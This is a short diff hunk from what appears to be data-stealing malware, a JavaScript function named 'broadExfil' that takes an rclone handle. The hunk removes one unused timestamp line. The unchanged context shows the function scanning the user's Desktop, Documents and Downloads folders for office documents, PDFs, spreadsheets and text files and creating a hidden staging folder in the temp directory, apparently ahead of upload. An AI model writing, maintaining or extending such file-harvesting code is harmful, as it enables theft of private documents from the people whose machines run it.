@@ -61,7 +61,6 @@ function broadExfil(rclone) {
   const home    = os.homedir();
   const folders = ['Desktop', 'Documents', 'Downloads'];
   const exts    = new Set(['.docx', '.doc', '.pdf', '.xlsx', '.xls', '.pptx', '.ppt', '.csv', '.txt']);
-  const ts      = new Date().toISOString().replace(/\D/g,'').slice(0,15);
   const stage   = path.join(os.tmpdir(), `drp_${process.pid}`);
 
   try { fs.mkdirSync(stage, { recursive: true }); } catch(_) { return; }
